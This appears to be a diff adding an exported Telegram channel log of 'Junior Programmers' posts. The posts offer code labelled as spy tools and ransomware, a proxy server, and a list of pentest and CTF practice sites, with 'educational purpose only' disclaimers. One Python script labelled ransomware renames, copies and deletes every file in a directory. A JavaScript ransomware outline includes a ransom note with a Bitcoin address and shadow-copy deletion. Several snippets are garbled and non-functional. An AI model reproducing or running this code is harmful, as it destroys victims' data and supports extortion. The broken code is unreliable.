@@ -1,0 +1,320 @@
+Junior Programmers, [08-01-2023 00:05]
+#
+
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+ 
+namespace SpyEye
+{
+    class Program
+    {
+        static void Main(string[] args)
+        { 
+            // Create a new instance of the SpyEye class 
+            SpyEye spy = new SpyEye();
+
+            // Set the target IP address 
+            spy.TargetIP = "127.0.0.1";
+
+            // Set the port to listen on 
+            spy.Port = 8080;
+
+            // Start the SpyEye server 
+            spy.Start();
+
+            // Wait for user input to stop the server 
+            Console.WriteLine("Press any key to stop the server...");  Console.ReadKey();
+
+            // Stop the SpyEye server 
+            spy.Stop();
+
+        }   }   }
+
+Legal Disclaimer: ⚠️This is Only For Educational Purpose Only. We Are Not Responsible Any Damage Caused By This Program⛔️")
+
+@Learn700programminglanguages
+
+Junior Programmers, [08-01-2023 00:07]
+#include <iostream>
+#include <string>
+#include <vector>
+ 
+using namespace std;
+ 
+// SpyEye class definition
+class SpyEye {
+private:
+    string name; // Name of the spy eye.
+    vector<string> targets; // List of targets to monitor.
+public:
+    // Constructor for SpyEye class.  Takes in a name and a list of targets.  Initializes the name and target list. 
+    SpyEye(string n, vector<string> t) : name(n), targets(t) {}
+
+    // Getter for the name of the spy eye.  Returns the name as a string.  
+    string getName() { return name; }
+
+    // Getter for the list of targets being monitored by this spy eye.  Returns a vector containing all of the targets being monitored by this spy eye.  
+    vector<string> getTargets() { return targets; }
+
+    // Adds a new target to be monitored by this spy eye.  Takes in a string representing the new target to be monitored and adds it to the list of targets being monitored by this spy eye.  
+    void addTarget(string t) { targets.push_back(t); }
+
+    // Removes an existing target from being monitored by this spy eye.  Takes in a string representing the target to be removed and removes it from the list of targets being monitored by this spy eye if it exists in that list.  
+    void removeTarget(string t) { 
+        for (int i = 0; i < targets.size(); i++) {  // Iterate through all elements in target list until we find one that matches t (the target we want to remove).  
+            if (targets[i] == t) {                // If we find one that matches, remove it from the list and break out of loop since we are done with our task here.  
+                targets[i] = "";                  // Set element at index i to empty string so that it is no longer part of our target list but still occupies space in memory so that our indices remain consistent throughout our program execution (so that we don't have any out-of-bounds errors).  
+                break;                            // Break out of loop since we are done with our task here.                  }                                                                                             }     } };
+
+ int main() {
+
+     vector<string> myTargets = {"John Doe", "Jane Doe", "Bob Smith"};
+
+     SpyEye mySpy("MySpy", myTargets);
+
+     cout << "Name: " << mySpy.getName() << endl;
+
+     cout << "Targets:" << endl;
+
+     for (int i = 0; i < mySpy.getTargets().size(); i++) {
+
+         cout << "\t" << mySpy.getTargets()[i] << endl;
+
+     }
+
+     cout << endl;
+
+     mySpy.addTarget("Alice Smith");
+
+     cout << "Added Alice Smith as new target." << endl;
+
+     cout << "New Targets:" << endl;
+
+     for (int i = 0; i < mySpy.getTargets().size(); i++) {
+
+         cout << "\t" << mySpy.getTargets()[i] << endl;
+
+     }
+
+Legal Disclaimer: ⚠️This is Only For Educational Purpose Only. We Are Not Responsible Any Damage Caused By This Program⛔️")
+
+@Learn700programminglanguages
+
+Junior Programmers, [08-01-2023 00:09]
+Legal Disclaimer: Usage of these Programs for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+
+@Learn700programminglanguages
+
+Junior Programmers, [08-01-2023 01:38]
+//Ransomware Attack in Python
+
+import os
+import shutil
+import random
+import string
+
+# Get the list of files in the current directory 
+files = os.listdir() 
+  
+# Iterate over all the files 
+for file in files: 
+
+    # Generate a random string of length 8 for the new file name 
+    new_file_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+
+    # Rename the file with the new name 
+    os.rename(file, new_file_name)
+
+    # Create a copy of the renamed file and store it in a different directory 
+    shutil.copy2(new_file_name, 'C:/encrypted/' + new_file_name)
+
+    # Delete the original file from its location 
+    os.remove(new_file_name)
+
+Legal Disclaimer: ⚠️This is Only For Educational Purpose Only. We Are Not Responsible Any Damage Caused By This Program⛔️")
+
+@Learn700programminglanguages
+
+Junior Programmers, [08-01-2023 01:39]
+//Ransomware Attack Code
+
+//1. Encrypt all files on the system using a strong encryption algorithm
+function encryptFiles() {
+  // Get list of all files on the system
+  let fileList = getFileList();
+
+  // Loop through each file and encrypt it using a strong encryption algorithm
+  for (let i = 0; i < fileList.length; i++) {
+    let file = fileList[i];
+
+    // Encrypt the file using a strong encryption algorithm
+    encryptFile(file);
+  }
+}
+
+//2. Create a ransom note with instructions on how to pay the ransom and where to send payment information. 
+function createRansomNote() {
+
+  // Create a ransom note with instructions on how to pay the ransom and where to send payment information. 
+  let ransomNote = You have been hacked! To regain access to your files, you must pay a ransom of $1000 in Bitcoin to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2. Once payment is received, we will provide you with a decryption key that will allow you to decrypt your files.;
+
+  // Save the ransom note as a text file in each directory containing encrypted files.  
+  saveRansomNote(ransomNote);  
+}
+
+ //3. Delete shadow copies of files so that victims cannot recover their data without paying the ransom.  
+function deleteShadowCopies() {
+
+  // Get list of all shadow copies on the system  
+  let shadowCopyList = getShadowCopyList();
+
+  // Loop through each shadow copy and delete it  
+  for (let i = 0; i < shadowCopyList.length; i++) {                       let shadowCopy = shadowCopyList[i];     deleteShadowCopy(shadowCopy);   } }
+
+Legal Disclaimer: ⚠️This is Only For Educational Purpose Only. We Are Not Responsible Any Damage Caused By This Program⛔️")
+
+@Learn700programminglanguages
+
+Junior Programmers, [08-01-2023 01:45]
+print("Coded By: https://t.me/Juniorprogrammerboy")
+
+print("")
+
+print("@juniorprogrammerboy")
+
+print("")
+
+import socket
+import threading
+
+# IP and port of the proxy server
+HOST = '127.0.0.1' 
+PORT = 8888 
+  
+# Create a socket object 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+  
+# Bind to the port 
+s.bind((HOST, PORT)) 
+  
+# Listen for incoming connections from client 
+s.listen(5) 
+
+   # Establish connection with client 
+
+    # Function for handling connections from multiple clients and save to file
+
+    def handle_client(conn):
+
+        # Get the request from browser 
+
+        request = conn.recv(1024)
+
+        # Parse the first line of the request to get url
+
+        request_line = request.split('\n')[0]
+
+        url = request_line.split(' ')[1]
+
+        # Find the webserver and port
+
+        http_pos = url.find("://")          # find pos of ://
+
+        if (http_pos==-1):
+
+            temp = url
+
+        else:
+
+            temp = url[(http_pos+3):]       # get the rest of url
+
+        
+        port_pos = temp.find(":")           # find the port pos (if any)
+
+         # Find end of web server
+
+        webserver_pos = temp.find("/")
+
+        if webserver_pos == -1:
+
+            webserver_pos = len(temp)     # default value for end of web server is length of string if not found '/' in string                    webserver = ""      # default value for web server is empty string if not found '/' in string          port = -1          # default value for port is -1 if not found ':' in string     else:         webserver = temp[:webserver_pos]      # get the web server name         port = int((temp[(port_pos+1):])[:webserver_pos-port_pos-1])      # get the port number as integer   try:   conn2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)   conn2.connect((webserver,port))   message="GET "+url+" HTTP/1.1\r\n\r\n"   conn2.sendall(message)   reply=conn2.recv(4096) except Exception as e: print("Exception occurred:{}".format(e)) finally: conn2.close() conn3=conn reply=reply+"Proxy Server Connected" conn3 .sendall (reply) conn3 .close() while True: print ('Server listening....') conn, addr= s .accept () print ('Connected with ' + addr [ 0 ] + ':' + str (addr [ 1 ])) t=threading .Thread (target=handle _client , args=(conn , )) t .start ()
+
+Legal Disclaimer: ⚠️This is Only For Educational Purpose Only. We Are Not Responsible Any Damage Caused By This Program⛔️")
+
+Junior Programmers, [08-01-2023 02:29]
+Free Labs to Train Your Pentest / CTF Skills
+
+-> Academy Hackaflag -BR https://academy.hackaflag.com.br
+
+-> Try Hack Me https://tryhackme.com
+
+-> Attack-Defense https://attackdefense.com
+
+-> alert to win https://alf.nu/alert1
+
+-> CTF Komodo Security https://ctf.komodosec.com
+
+-> CMD Challenge https://cmdchallenge.com
+
+-> Explotation Education https://exploit.education
+
+-> Google CTF https://capturetheflag.withgoogle.com
+
+-> HackTheBox https://www.hackthebox.eu
+
+-> Hackthis https://www.hackthis.co.uk
+
+-> Hacksplaining https://www.hacksplaining.com/exercises
+
+-> Hacker101 https://ctf.hacker101.com
+
+-> Hacker Security https://capturetheflag.com.br
+
+-> Hacking-Lab https://www.hacking-lab.com/index.html
+
+-> HSTRIKE https://hstrike.com
+
+-> ImmersiveLabs https://immersivelabs.com
+
+-> Labs Wizard Security https://labs.wizard-security.net
+
+-> NewbieContest https://www.newbiecontest.org
+
+-> OverTheWire http://overthewire.org
+
+-> Practical Pentest Labs https://practicalpentestlabs.com
+
+-> Pentestlab https://pentesterlab.com
+
+-> Penetration Testing Practice Labs http://www.amanhardikar.com/mindmaps/Practice.html
+
+-> PentestIT LAB https://lab.pentestit.ru
+
+-> PicoCTF https://picoctf.com
+
+-> PWNABLE https://pwnable.kr/play.php
+
+-> Root-Me https://www.root-me.org
+
+-> Root in Jail http://ctf.rootinjail.com
+
+-> Shellter https://shellterlabs.com/pt
+
+-> SANS Challenger https://www.holidayhackchallenge.com
+
+-> SmashTheStack http://smashthestack.org/wargames.html
+
+-> Try Hack Me https://tryhackme.com
+
+-> The Cryptopals Crypto Challenges https://cryptopals.com
+
+-> Vulnhub https://www.vulnhub.com
+
+-> W3Challs https://w3challs.com
+
+-> WeChall http://www.wechall.net
+
+-> Zenk-Security https://www.zenk-security.com/epreuves.php
